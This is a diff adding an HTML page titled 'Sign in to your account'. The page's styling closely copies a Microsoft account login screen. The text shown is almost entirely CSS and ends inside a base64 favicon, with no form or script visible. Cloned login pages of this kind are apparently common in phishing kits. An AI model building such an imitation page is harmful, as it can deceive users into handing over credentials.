@@ -1,0 +1,1819 @@
+<!DOCTYPE html>
+<html dir="ltr" class lang="en">
+
+<head>
+<meta charset="utf-8">
+<title>Sign in to your account</title>
+
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
+<meta http-equiv="Pragma" content="no-cache">
+<meta http-equiv="Expires" content="-1">
+
+<meta http-equiv="x-dns-prefetch-control" content="on">
+
+
+
+<meta name="PageID" content="ConvergedTFA">
+<meta name="SiteID" content>
+<meta name="ReqLC" content="1033">
+<meta name="LocLC" content="en-US">
+  
+ 
+ 
+<style>
+html {
+font-family: sans-serif;
+-ms-text-size-adjust: 100%;
+-webkit-text-size-adjust: 100%
+}
+
+body {
+margin: 0
+}
+
+a {
+background-color: transparent
+}
+
+a:active,
+a:hover {
+outline: 0
+}
+
+strong {
+font-weight: bold
+}
+
+img {
+border: 0
+}
+
+input {
+color: inherit;
+font: inherit;
+margin: 0
+}
+
+input[type="submit"] {
+-webkit-appearance: button;
+cursor: pointer
+}
+
+input[type="checkbox"] {
+box-sizing: border-box;
+padding: 0
+}
+
+* {
+-webkit-box-sizing: border-box;
+-moz-box-sizing: border-box;
+box-sizing: border-box
+}
+
+*:before,
+*:after {
+-webkit-box-sizing: border-box;
+-moz-box-sizing: border-box;
+box-sizing: border-box
+}
+
+input {
+font-family: inherit;
+font-size: inherit
+}
+
+a:focus {
+outline: thin dotted;
+outline-offset: -2px;
+outline: 5px auto -webkit-focus-ring-color
+}
+
+img {
+vertical-align: middle
+}
+
+html {
+font-size: 100%
+}
+
+body {
+font-family: "Segoe UI Webfont", -apple-system, "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
+font-weight: 400;
+font-size: .9375rem;
+line-height: 1.25rem;
+padding-bottom: .227px;
+padding-top: .227px;
+background-color: #fff
+}
+
+a {
+color: #ccc;
+text-decoration: none
+}
+
+a:link {
+color: #0067b8
+}
+
+a:visited {
+color: #0067b8
+}
+
+a:hover {
+color: #666
+}
+
+a:focus {
+color: #0067b8
+}
+
+a:active {
+color: #999
+}
+
+@font-face {
+font-family: "Segoe UI Webfont";
+src: local("Segoe UI");
+font-weight: 400;
+font-style: normal
+}
+
+@font-face {
+font-family: "Segoe UI Webfont";
+src: local("Segoe UI Semibold");
+font-weight: 600;
+font-style: normal
+}
+
+.text-title {
+line-height: 1.75rem;
+padding-bottom: 2.3632px;
+padding-top: 2.3632px
+}
+
+.text-body,
+p {
+font-weight: 400;
+font-size: .9375rem;
+line-height: 1.25rem;
+padding-bottom: .227px;
+padding-top: .227px
+}
+
+.row:before,
+.row:after {
+content: " ";
+display: table
+}
+
+.row:after {
+clear: both
+}
+
+.col-xs-24,
+.col-md-24 {
+position: relative;
+min-height: 1px;
+padding-left: 2px;
+padding-right: 2px
+}
+
+.col-xs-24 {
+float: left
+}
+
+.col-xs-24 {
+width: 100%
+}
+
+@media (min-width:768px) {
+.col-md-24 {
+float: left
+}
+
+.col-md-24 {
+width: 100%
+}
+}
+
+label {
+display: inline-block;
+max-width: 100%
+}
+
+input[type="file"]:focus,
+input[type="radio"]:focus,
+input[type="checkbox"]:focus {
+outline: thin dotted;
+outline-offset: -2px;
+outline: 5px auto -webkit-focus-ring-color
+}
+
+.form-control {
+display: block;
+width: 100%;
+background-image: none
+}
+
+.checkbox {
+position: relative;
+display: block
+}
+
+.checkbox label {
+min-height: 20px;
+cursor: pointer
+}
+
+input {
+max-width: 100%;
+line-height: inherit
+}
+
+input[type="tel"] {
+border-style: solid
+}
+
+.text-input-focus,
+input[type="color"]:focus,
+input[type="date"]:focus,
+input[type="datetime"]:focus,
+input[type="datetime-local"]:focus,
+input[type="email"]:focus,
+input[type="month"]:focus,
+input[type="number"]:focus,
+input[type="password"]:focus,
+input[type="search"]:focus,
+input[type="tel"]:focus,
+input[type="text"]:focus,
+input[type="time"]:focus,
+input[type="url"]:focus,
+input[type="week"]:focus,
+textarea:focus {
+border-color: #0067b8;
+background-color: #fff
+}
+
+.text-input-webkit-placeholder,
+input[type="color"]::-webkit-input-placeholder,
+input[type="date"]::-webkit-input-placeholder,
+input[type="datetime"]::-webkit-input-placeholder,
+input[type="datetime-local"]::-webkit-input-placeholder,
+input[type="email"]::-webkit-input-placeholder,
+input[type="month"]::-webkit-input-placeholder,
+input[type="number"]::-webkit-input-placeholder,
+input[type="password"]::-webkit-input-placeholder,
+input[type="search"]::-webkit-input-placeholder,
+input[type="tel"]::-webkit-input-placeholder,
+input[type="text"]::-webkit-input-placeholder,
+input[type="time"]::-webkit-input-placeholder,
+input[type="url"]::-webkit-input-placeholder,
+input[type="week"]::-webkit-input-placeholder,
+textarea::-webkit-input-placeholder {
+color: rgba(0, 0, 0, 0.6)
+}
+
+input::-ms-clear,
+input::-ms-reveal {
+height: 100%;
+padding: 4px 8px;
+margin-right: -8px;
+margin-left: 4px
+}
+
+input::-ms-clear:hover,
+input::-ms-reveal:hover {
+color: #0067b8
+}
+
+input::-ms-clear:active,
+input::-ms-reveal:active {
+color: #fff;
+background-color: #0067b8
+}
+
+input[type="checkbox"] {
+width: 20px;
+height: 20px
+}
+
+.checkbox label {
+padding-left: 28px
+}
+
+.checkbox input[type="checkbox"] {
+position: absolute;
+margin-left: -28px
+}
+
+input[type="submit"] {
+padding: 4px 12px 4px 12px;
+position: relative;
+max-width: 100%;
+text-align: center;
+white-space: nowrap;
+overflow: hidden;
+vertical-align: middle;
+text-overflow: ellipsis;
+touch-action: manipulation;
+border-style: solid;
+border-width: 2px
+}
+
+.btn:hover,
+.btn:focus,
+button:hover,
+button:focus,
+input[type="button"]:hover,
+input[type="button"]:focus,
+input[type="submit"]:hover,
+input[type="submit"]:focus,
+input[type="reset"]:hover,
+input[type="reset"]:focus {
+border-color: rgba(0, 0, 0, 0.4)
+}
+
+.btn:hover,
+button:hover,
+input[type="button"]:hover,
+input[type="submit"]:hover,
+input[type="reset"]:hover {
+cursor: pointer
+}
+
+.btn:active,
+button:active,
+input[type="button"]:active,
+input[type="submit"]:active,
+input[type="reset"]:active {
+background-color: rgba(0, 0, 0, 0.4);
+border-color: transparent
+}
+
+@-ms-viewport {
+width: device-width
+}
+
+@font-face {
+font-family: "Segoe UI Webfont";
+font-weight: 700;
+src: local("Segoe UI Bold")
+}
+
+a:focus {
+outline-offset: 0
+}
+
+input[type="file"]:focus,
+input[type="radio"]:focus,
+input[type="checkbox"]:focus {
+outline-offset: 0
+}
+
+body {
+direction: ltr
+}
+
+.wrap-content {
+word-wrap: break-word
+}
+
+.text-secondary {
+color: rgba(0, 0, 0, 0.7);
+font-size: 13px
+}
+
+body.cb .text-13 {
+font-size: .8125rem
+}
+
+body.cb div.placeholderContainer {
+width: 100%;
+position: relative
+}
+
+.no-margin-top {
+margin-top: 0
+}
+
+.no-padding-left-right {
+padding-left: 0;
+padding-right: 0
+}
+
+@keyframes pulse {
+from {
+opacity: .4
+}
+}
+
+@-o-keyframes pulse {
+from {
+opacity: .4
+}
+}
+
+@-moz-keyframes pulse {
+from {
+opacity: .4
+}
+}
+
+@-webkit-keyframes pulse {
+from {
+opacity: .4
+}
+}
+
+@-webkit-keyframes progressDot {
+
+0%,
+20% {
+left: 0;
+-webkit-animation-timing-function: ease-out;
+opacity: 0
+}
+
+25% {
+opacity: 1
+}
+
+35% {
+left: 45%;
+-webkit-animation-timing-function: linear
+}
+
+65% {
+left: 60%;
+-webkit-animation-timing-function: ease-in
+}
+
+75% {
+opacity: 1
+}
+
+80%,
+100% {
+left: 100%;
+opacity: 0
+}
+}
+
+@-moz-keyframes progressDot {
+
+0%,
+20% {
+left: 0;
+-moz-animation-timing-function: ease-out;
+opacity: 0
+}
+
+25% {
+opacity: 1
+}
+
+35% {
+left: 45%;
+-moz-animation-timing-function: linear
+}
+
+65% {
+left: 60%;
+-moz-animation-timing-function: ease-in
+}
+
+75% {
+opacity: 1
+}
+
+80%,
+100% {
+left: 100%;
+opacity: 0
+}
+}
+
+@-o-keyframes progressDot {
+
+0%,
+20% {
+left: 0;
+-o-animation-timing-function: ease-out;
+opacity: 0
+}
+
+25% {
+opacity: 1
+}
+
+35% {
+left: 45%;
+-o-animation-timing-function: linear
+}
+
+65% {
+left: 60%;
+-o-animation-timing-function: ease-in
+}
+
+75% {
+opacity: 1
+}
+
+80%,
+100% {
+left: 100%;
+opacity: 0
+}
+}
+
+@keyframes progressDot {
+
+0%,
+20% {
+left: 0;
+animation-timing-function: ease-out;
+opacity: 0
+}
+
+25% {
+opacity: 1
+}
+
+35% {
+left: 45%;
+animation-timing-function: linear
+}
+
+65% {
+left: 60%;
+animation-timing-function: ease-in
+}
+
+75% {
+opacity: 1
+}
+
+80%,
+100% {
+left: 100%;
+opacity: 0
+}
+}
+
+@keyframes fadeIn {
+from {
+opacity: 0
+}
+
+to {
+opacity: 1
+}
+}
+
+@-o-keyframes fadeIn {
+from {
+opacity: 0
+}
+
+to {
+opacity: 1
+}
+}
+
+@-moz-keyframes fadeIn {
+from {
+opacity: 0
+}
+
+to {
+opacity: 1
+}
+}
+
+@-webkit-keyframes fadeIn {
+from {
+opacity: 0
+}
+
+to {
+opacity: 1
+}
+}
+
+body.cb {
+color: #1b1b1b;
+text-align: left
+}
+
+body.remove-segoe-ui-symbol:lang(zh) {
+font-family: "Segoe UI", -apple-system, "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math"
+}
+
+.background-image-holder {
+position: fixed;
+top: 0;
+width: 100%;
+height: 100%
+}
+
+.footer {
+position: absolute;
+left: 0;
+bottom: 0;
+width: 100%;
+overflow: visible;
+z-index: 99;
+clear: both;
+min-height: 28px
+}
+
+.footer.has-background {
+background-color: rgba(0, 0, 0, 0.6)
+}
+
+div.footerNode {
+margin: 0;
+float: right
+}
+
+.footer-content.footer-item {
+font-size: 12px;
+line-height: 28px;
+white-space: nowrap;
+display: inline-block;
+margin-left: 8px;
+margin-right: 8px
+}
+
+.footer-content.footer-item.debug-item {
+text-decoration: none;
+letter-spacing: 3px;
+line-height: 22px;
+vertical-align: top;
+font-size: 16px;
+font-weight: 600
+}
+
+.footer-content.footer-item.has-background,
+.footer-content.footer-item.debug-item.has-background {
+color: #fff
+}
+
+.outer {
+display: table;
+position: absolute;
+height: 100%;
+width: 100%
+}
+
+.middle {
+display: table-cell;
+vertical-align: middle
+}
+
+.sign-in-box {
+margin-left: auto;
+margin-right: auto;
+position: relative;
+max-width: 440px;
+width: calc(100% - 40px);
+padding: 44px;
+margin-bottom: 28px;
+background-color: #fff;
+-webkit-box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+-moz-box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+min-width: 320px;
+min-height: 338px;
+overflow: hidden
+}
+
+a:hover {
+text-decoration: underline
+}
+
+.template-section {
+display: table-row
+}
+
+.template-section.main-section {
+height: 100%
+}
+
+input[type="tel"] {
+padding: 6px 10px;
+border-width: 1px;
+border-color: rgba(0, 0, 0, 0.6);
+height: 36px;
+outline: none;
+border-radius: 0;
+-webkit-border-radius: 0;
+background-color: transparent
+}
+
+.text-input-hover,
+input[type="color"]:hover,
+input[type="date"]:hover,
+input[type="datetime"]:hover,
+input[type="datetime-local"]:hover,
+input[type="email"]:hover,
+input[type="month"]:hover,
+input[type="number"]:hover,
+input[type="password"]:hover,
+input[type="search"]:hover,
+input[type="tel"]:hover,
+input[type="text"]:hover,
+input[type="time"]:hover,
+input[type="url"]:hover,
+input[type="week"]:hover,
+textarea:hover,
+select:hover {
+border-color: #323232;
+border-color: rgba(0, 0, 0, 0.8)
+}
+
+.text-input-focus,
+input[type="color"]:focus,
+input[type="date"]:focus,
+input[type="datetime"]:focus,
+input[type="datetime-local"]:focus,
+input[type="email"]:focus,
+input[type="month"]:focus,
+input[type="number"]:focus,
+input[type="password"]:focus,
+input[type="search"]:focus,
+input[type="tel"]:focus,
+input[type="text"]:focus,
+input[type="time"]:focus,
+input[type="url"]:focus,
+input[type="week"]:focus,
+textarea:focus,
+select:focus {
+border-color: #0067b8;
+background-color: transparent
+}
+
+input[type="submit"] {
+min-height: 32px;
+border: none;
+min-width: 108px;
+line-height: normal
+}
+
+.btn-hover,
+.btn:hover,
+button:hover,
+input[type="button"]:hover,
+input[type="submit"]:hover,
+input[type="reset"]:hover {
+background-color: #b2b2b2;
+background-color: rgba(0, 0, 0, 0.3)
+}
+
+.btn-focus,
+.btn:focus,
+button:focus,
+input[type="button"]:focus,
+input[type="submit"]:focus,
+input[type="reset"]:focus {
+background-color: #b2b2b2;
+background-color: rgba(0, 0, 0, 0.3);
+text-decoration: underline;
+outline: 2px solid #000
+}
+
+.btn-active,
+.btn:active,
+button:active,
+input[type="button"]:active,
+input[type="submit"]:active,
+input[type="reset"]:active,
+.btn.btn-primary-active,
+.btn.btn-primary:active,
+button.btn-primary:active,
+input[type="button"].btn-primary:active,
+input[type="submit"].btn-primary:active,
+input[type="reset"].btn-primary:active {
+outline: none;
+text-decoration: none;
+-ms-transform: scale(.98);
+-webkit-transform: scale(.98);
+transform: scale(.98)
+}
+
+.button.primary {
+color: #fff;
+border-color: #0067b8;
+background-color: #0067b8;
+display: block;
+width: 100%
+}
+
+.button.primary:hover {
+background-color: #005da6
+}
+
+.button.primary:focus {
+background-color: #005da6;
+text-decoration: underline;
+outline: 2px solid #000
+}
+
+.button.primary:active {
+outline: none;
+text-decoration: none;
+-ms-transform: scale(.98);
+-webkit-transform: scale(.98);
+transform: scale(.98)
+}
+
+.identityBanner {
+height: 24px;
+background: #fff;
+margin-top: 16px;
+margin-bottom: -4px
+}
+
+.identity {
+line-height: 24px;
+white-space: nowrap;
+overflow: hidden;
+text-overflow: ellipsis
+}
+
+.boilerplate-text {
+background-color: #f2f2f2;
+padding: 24px 44px 36px 44px;
+margin: 76px -44px -44px -44px
+}
+
+.boilerplate-text>p:first-child {
+margin-top: 0
+}
+
+.boilerplate-text>p:last-child {
+margin-bottom: 0
+}
+
+.row {
+margin-left: 0;
+margin-right: 0
+}
+
+.tile-img {
+position: relative
+}
+
+.tile-img.small {
+width: 24px;
+height: 24px;
+float: left;
+margin-right: 8px
+}
+
+.text-body,
+p {
+padding: 0;
+margin-top: 16px;
+margin-bottom: 12px
+}
+
+.form-group {
+margin-bottom: 16px
+}
+
+.form-group label {
+margin-top: 0;
+margin-bottom: 0
+}
+
+input[type="submit"] {
+margin-top: 0;
+margin-bottom: 0
+}
+
+.no-margin-bottom {
+margin-bottom: 0
+}
+
+.no-margin-top-bottom {
+margin-top: 0;
+margin-bottom: 0
+}
+
+.overflow-hidden {
+overflow: hidden
+}
+
+.banner-logo {
+max-height: 36px
+}
+
+.button-container {
+position: absolute;
+right: 0;
+text-align: right
+}
+
+.move-buttons div.button-container {
+bottom: auto
+}
+
+@media (max-width:600px),
+(max-height:366px) {
+.background-image-holder {
+display: none
+}
+
+.middle {
+vertical-align: top
+}
+
+.sign-in-box {
+padding: 24px;
+margin-top: 0;
+margin-bottom: 88px;
+width: 100vw;
+-webkit-box-shadow: none;
+-moz-box-shadow: none;
+box-shadow: none;
+border: 0
+}
+
+.footer.has-background {
+background-color: #fff;
+filter: none
+}
+
+div.footerNode {
+float: left;
+margin: 0 24px !important
+}
+
+.footer-content.footer-item.has-background,
+.footer-content.footer-item.debug-item.has-background {
+color: #747474
+}
+
+.boilerplate-text {
+padding: 20px;
+margin-top: 56px;
+margin-right: 0;
+margin-bottom: 0;
+margin-left: 0
+}
+
+.move-buttons div.button-container {
+bottom: auto
+}
+}
+
+.inline-block {
+display: inline-block
+}
+
+input[type="tel"] {
+border-top-width: 0;
+border-left-width: 0;
+border-right-width: 0;
+padding-left: 0
+}
+
+.text-title {
+color: #1b1b1b;
+font-size: 1.5rem;
+font-weight: 600;
+padding: 0;
+margin-top: 16px;
+margin-bottom: 12px;
+font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math"
+}
+
+.text-title:lang(zh-cn),
+.text-title:lang(zh-tw),
+.text-title p:lang(zh-cn),
+.text-title p:lang(zh-tw) {
+font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math"
+}
+
+.pagination-view {
+position: relative
+}
+
+.pagination-view.has-identity-banner {
+min-height: 170px
+}
+
+.lightbox-cover {
+background-color: white;
+opacity: 0;
+z-index: -1;
+height: 100%;
+width: 100%;
+position: absolute;
+top: 0;
+left: 0;
+transition: all .5s ease-in;
+-o-transition: all .5s ease-in;
+-moz-transition: all .5s ease-in;
+-webkit-transition: all .5s ease-in
+}
+
+@media (-ms-high-contrast:active) {
+input[type="submit"] {
+-ms-high-contrast-adjust: none
+}
+
+.btn:hover,
+.button:hover,
+button:hover,
+input[type="button"]:hover,
+input[type="submit"]:hover,
+input[type="reset"]:hover,
+.btn.btn-google:hover {
+outline: 1px solid windowText;
+border: 1px solid highlight;
+background-color: highlight;
+color: highlightText;
+text-decoration: none
+}
+
+.btn:hover:focus,
+.button:hover:focus,
+button:hover:focus,
+input[type="button"]:hover:focus,
+input[type="submit"]:hover:focus,
+input[type="reset"]:hover:focus,
+.btn.btn-google:hover:focus {
+outline: 1px solid windowText;
+border: 1px solid windowText;
+background-color: highlight;
+color: highlightText;
+text-decoration: underline
+}
+
+.btn:focus,
+.button:focus,
+button:focus,
+input[type="button"]:focus,
+input[type="submit"]:focus,
+input[type="reset"]:focus,
+.btn.btn-google:focus {
+outline: 1px solid windowText;
+border: 1px solid windowText;
+background-color: window;
+color: windowText;
+text-decoration: underline
+}
+
+input[type="submit"].primary {
+outline: 1px solid highlight;
+border: 1px solid highlight;
+background-color: highlight;
+color: highlightText;
+text-decoration: none
+}
+
+.btn.btn-primary:hover,
+.button.btn-primary:hover,
+button.btn-primary:hover,
+input[type="button"].btn-primary:hover,
+input[type="submit"].btn-primary:hover,
+input[type="reset"].btn-primary:hover,
+.btn.btn-google.btn-primary:hover,
+.btn.primary:hover,
+.button.primary:hover,
+button.primary:hover,
+input[type="button"].primary:hover,
+input[type="submit"].primary:hover,
+input[type="reset"].primary:hover,
+.btn.btn-google.primary:hover,
+.btn.secondary:hover,
+.button.secondary:hover,
+button.secondary:hover,
+input[type="button"].secondary:hover,
+input[type="submit"].secondary:hover,
+input[type="reset"].secondary:hover,
+.btn.btn-google.secondary:hover {
+outline: 1px solid highlight;
+border: 1px solid window;
+background-color: window;
+color: highlight;
+text-decoration: none
+}
+
+.btn.btn-primary:hover:focus,
+.button.btn-primary:hover:focus,
+button.btn-primary:hover:focus,
+input[type="button"].btn-primary:hover:focus,
+input[type="submit"].btn-primary:hover:focus,
+input[type="reset"].btn-primary:hover:focus,
+.btn.btn-google.btn-primary:hover:focus,
+.btn.primary:hover:focus,
+.button.primary:hover:focus,
+button.primary:hover:focus,
+input[type="button"].primary:hover:focus,
+input[type="submit"].primary:hover:focus,
+input[type="reset"].primary:hover:focus,
+.btn.btn-google.primary:hover:focus,
+.btn.secondary:hover:focus,
+.button.secondary:hover:focus,
+button.secondary:hover:focus,
+input[type="button"].secondary:hover:focus,
+input[type="submit"].secondary:hover:focus,
+input[type="reset"].secondary:hover:focus,
+.btn.btn-google.secondary:hover:focus {
+outline: 1px solid windowText;
+border: 1px solid window;
+background-color: window;
+color: highlight;
+text-decoration: underline
+}
+
+.btn.btn-primary:focus,
+.button.btn-primary:focus,
+button.btn-primary:focus,
+input[type="button"].btn-primary:focus,
+input[type="submit"].btn-primary:focus,
+input[type="reset"].btn-primary:focus,
+.btn.btn-google.btn-primary:focus,
+.btn.primary:focus,
+.button.primary:focus,
+button.primary:focus,
+input[type="button"].primary:focus,
+input[type="submit"].primary:focus,
+input[type="reset"].primary:focus,
+.btn.btn-google.primary:focus,
+.btn.secondary:focus,
+.button.secondary:focus,
+button.secondary:focus,
+input[type="button"].secondary:focus,
+input[type="submit"].secondary:focus,
+input[type="reset"].secondary:focus,
+.btn.btn-google.secondary:focus {
+outline: 1px solid windowText;
+border: 1px solid window;
+background-color: highlight;
+color: highlightText;
+text-decoration: underline
+}
+}
+
+.fade-in-lightbox {
+animation: fadeIn .3s ease-in;
+-webkit-animation: fadeIn .3s ease-in;
+-moz-animation: fadeIn .3s ease-in;
+-ms-animation: fadeIn .3s ease-in;
+-o-animation: fadeIn .3s ease-in
+}
+
+.animate {
+animation-duration: .25s;
+-webkit-animation-duration: .25s;
+-moz-animation-duration: .25s;
+-ms-animation-duration: .25s;
+-o-animation-duration: .25s;
+animation-timing-function: cubic-bezier(.5, 0, .5, 1);
+-webkit-animation-timing-function: cubic-bezier(.5, 0, .5, 1);
+-moz-animation-timing-function: cubic-bezier(.5, 0, .5, 1);
+-ms-animation-timing-function: cubic-bezier(.5, 0, .5, 1);
+-o-animation-timing-function: cubic-bezier(.5, 0, .5, 1);
+animation-fill-mode: both;
+-webkit-animation-fill-mode: both;
+-moz-animation-fill-mode: both;
+-ms-animation-fill-mode: both;
+-o-animation-fill-mode: both;
+transition-property: left;
+-webkit-transition-property: left;
+-moz-transition-property: left;
+-ms-transition-property: left;
+-o-transition-property: left
+}
+
+html[dir=ltr] .animate.slide-in-next {
+animation-name: show-from-right;
+-webkit-animation-name: show-from-right;
+-moz-animation-name: show-from-right;
+-ms-animation-name: show-from-right;
+-o-animation-name: show-from-right
+}
+
+@keyframes hide-to-left {
+from {
+left: 0;
+opacity: 1
+}
+
+to {
+left: -200px;
+opacity: 0
+}
+}
+
+@keyframes show-from-right {
+from {
+left: 200px;
+opacity: 0
+}
+
+to {
+left: 0;
+opacity: 1
+}
+}
+
+@keyframes hide-to-right {
+from {
+left: 0;
+opacity: 1
+}
+
+to {
+left: 200px;
+opacity: 0
+}
+}
+
+@keyframes show-from-left {
+from {
+left: -200px;
+opacity: 0
+}
+
+to {
+left: 0;
+opacity: 1
+}
+}
+
+@-webkit-keyframes hide-to-left {
+from {
+left: 0;
+opacity: 1
+}
+
+to {
+left: -200px;
+opacity: 0
+}
+}
+
+@-webkit-keyframes show-from-right {
+from {
+left: 200px;
+opacity: 0
+}
+
+to {
+left: 0;
+opacity: 1
+}
+}
+
+@-webkit-keyframes hide-to-right {
+from {
+left: 0;
+opacity: 1
+}
+
+to {
+left: 200px;
+opacity: 0
+}
+}
+
+@-webkit-keyframes show-from-left {
+from {
+left: -200px;
+opacity: 0
+}
+
+to {
+left: 0;
+opacity: 1
+}
+}
+
+@-moz-keyframes hide-to-left {
+from {
+left: 0;
+opacity: 1
+}
+
+to {
+left: -200px;
+opacity: 0
+}
+}
+
+@-moz-keyframes show-from-right {
+from {
+left: 200px;
+opacity: 0
+}
+
+to {
+left: 0;
+opacity: 1
+}
+}
+
+@-moz-keyframes hide-to-right {
+from {
+left: 0;
+opacity: 1
+}
+
+to {
+left: 200px;
+opacity: 0
+}
+}
+
+@-moz-keyframes show-from-left {
+from {
+left: -200px;
+opacity: 0
+}
+
+to {
+left: 0;
+opacity: 1
+}
+}
+
+@-ms-keyframes hide-to-left {
+from {
+left: 0;
+opacity: 1
+}
+
+to {
+left: -200px;
+opacity: 0
+}
+}
+
+@-ms-keyframes show-from-right {
+from {
+left: 200px;
+opacity: 0
+}
+
+to {
+left: 0;
+opacity: 1
+}
+}
+
+@-ms-keyframes hide-to-right {
+from {
+left: 0;
+opacity: 1
+}
+
+to {
+left: 200px;
+opacity: 0
+}
+}
+
+@-ms-keyframes show-from-left {
+from {
+left: -200px;
+opacity: 0
+}
+
+to {
+left: 0;
+opacity: 1
+}
+}
+
+@-o-keyframes hide-to-left {
+from {
+left: 0;
+opacity: 1
+}
+
+to {
+left: -200px;
+opacity: 0
+}
+}
+
+@-o-keyframes show-from-right {
+from {
+left: 200px;
+opacity: 0
+}
+
+to {
+left: 0;
+opacity: 1
+}
+}
+
+@-o-keyframes hide-to-right {
+from {
+left: 0;
+opacity: 1
+}
+
+to {
+left: 200px;
+opacity: 0
+}
+}
+
+@-o-keyframes show-from-left {
+from {
+left: -200px;
+opacity: 0
+}
+
+to {
+left: 0;
+opacity: 1
+}
+}
+</style>
+
+
+
+
+
+
+<link rel="shortcut icon"
+href="data:image/*;base64,iVBORw0KGgoAAAANSUhEUgAAAEgAAABICAYAAABV7bNHAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAhHSURBVHhe7Zl7jFxVHce/9857Zmdn57Gza1s3FCMFG9AQoYpFi7VtImDTlkZ8VZsYlcZEaQ36D1GqFhCMQAwoFFjQf0AkFWqBWlMrEZpSIWAJam2lG1w7s6+Z7bwf9/o75552e2dm59zb1oRNzye5O3N+986d33zvOb/HWS3b/34TilnRxatiFpRAEpRAEpRAEpRAEpRAEpRAEpRAEpRAEpRAEpRAEpRAEpRAEpRAEpRAEpRAEpRAEpRAEpRAEpzvSZsmjPFJetO0xnMSL/T+hHjvDGcCMXGmi4g9/Sj0cASmMfdE0nQPjMIJ5G/YCL03SgZNnOmOY4GaNHsGGseheXzCOPcwGzVkfAPwpFKOBXIVg8xKVbybm5hl9/6rIC1BCSTBlUCaPrf11Dzu/Xf8CU3zwKzVwCK62WzOvYP5XatCc7loHNZBJqV2OqZLVAbN4TrI64XWGyaRiHOa5jkkkMMr3824EYfhQqDzk3Madd8NSjMfzqUfZzWDTMMAyhUqICvA6e0HlfXw0HEKjdZ+j3VtvS5sdrSeCDSKEQyz0YBZKPL3rWiBALRQUIws+PV0b1SpEDTJJy4RPXvmw+mZl8Z6lPxwwRkJxGKRmc9TwDYQ+sp6+FZeA+/C9wGhAFAsoznyNhpHR8k5Wuu03rWAH8Xv3Ybghs/Cs+iiFpHofCSE8p338V6JjT2pBILf3kQiFaxLBEyc+l/2o/bcHi4Se0DmxAS0dIr8+AL8V18Jff57KRjrZM+h+fZRNI9PcT80EseYyqN0931WL+YQ1wKZvKsfReS7mxG944fCKiej9aFv704Eli0VFju1A69gcsnHoccG4L1kERIvvyDO2Ck99BhObLoFWjRCP3gCsSeHEVq/RpztjjE2hWx6CJ7+9wiLHFcxiM0cY/wd9P32CVfiWLBSgU3/zvivvAKB5StglmipdEuXVG6ww5yeRjo/4lgchlnsvGy74U6gfA6R72xGcO11wtKOyWNAB7xB1J//I5rZjDC0E/vNY7T8pujHF1De8SyMItVdp9HMZlF/6QAJPYbEvt/TUomJM+3M6odLHAvEnz5dHb3rx8Jip7prN7I985D19CMTSAnrDHqsF6W7fobc2o3C0o4ejyPyrZvReOsfyK35DM3WMXHGIrf6iyg//mv4r1oO38eWCKudwq1bkfXHkdGTmFy2UljPHOcziLJE8Mb1YmDHGJ/A5LWraJ2EoCUTVNLn+dO2wYJ1uJdiR/csEr3nDiBIFS8oU9kyId0iEqG/TYRv2WIZWmDiFX5EDzCahJ5MorZvnzhjoYXD4p1znM+gUhGBdZ2XVvHOe6AHBilNe0gH6nYigyhsuRXlh4dReuBBlIcf58GdV7AOqtjeX9xLEYtiUSv8syUEVn3CGrdQ/MnPaabO400pa6w19KB47/0o/XI7Sg8+jNL2R6H5/09pvjl2HP1HXofnwoXCMsPk0k+h8cZhaEFK8wKzVObNrYWog6o1eK/+KBK7nhB2FitMLmorGU8cicOvwXfhBcJC3/PJ1WgcOIh04T/CYicTXkCzJGjbdTCmqXQ4mRzOoA5yNoN4VvFD62+PLQwWvG0FGaGFQ9D7YuKgpTXLVkntpf2o//VVMZqhb/dTMKfovqfDJmF05iHYYB17mbJUi9is5jnlh0txGI6XGGe25eFg2cyGnkggt2qtGM0QWE6B+LLFYiRgD4oVn53gZnc/xwnO7sgFoHKeKtFO6PH+mWnsElZl1yeOobpzl7DMoPla/kFA4pjFzq0Ka2+0CAVhViedQxxLTq6hcfiwGNnxfvjyth6L1SHNsQwdo/ww6w3xlNvRKWPlv/QNM